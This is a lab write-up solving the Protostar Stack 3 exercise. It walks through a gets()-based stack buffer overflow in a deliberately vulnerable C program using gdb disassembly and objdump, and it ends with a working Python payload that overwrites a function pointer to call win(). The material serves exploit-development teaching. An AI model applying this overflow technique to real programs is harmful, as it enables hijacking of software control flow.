# PROTOSTAR : STACK 3
[Protostar:Stack3](https://exploit.education/protostar/stack-three/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

We need to fill the **buffer** variable first then append the address of the **win()** function so that the poiner ***fp** goes to the **win()** function.

### **SOLUTION**

Below is the disassembly of the **main()**function
```
user@protostar:/opt/protostar/bin$ gdb -q stack3
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
End of assembler dump.
(gdb) 
```

Running input and analyzing the program. **Padding = 68** and as you can see the function pointer jumps to **0x41414141** but since it is not a valid memory address it show **Segmentation Fault**.
```
(gdb) b *0x08048450
Breakpoint 1 at 0x8048450: file stack3/stack3.c, line 18.
(gdb) r
Starting program: /opt/protostar/bin/stack3 

Breakpoint 1, 0x08048450 in main (argc=1, argv=0xbffff874) at stack3/stack3.c:18
18      stack3/stack3.c: No such file or directory.
        in stack3/stack3.c
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

Now lets replace the last four bytes with the address of the **win()** function. Before replacing, lets find the address of the win function first.
```
user@protostar:/opt/protostar/bin$ objdump -t stack3 | grep "win"
08048424 g     F .text  00000014              win
user@protostar:/opt/protostar/bin$ 
```


Filled the **buffer** then appended the string with the address of the **win()** function.
```
user@protostar:/opt/protostar/bin$ (python -c "print 'A'*64 + '\x24\x84\x04\x08'") | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
```

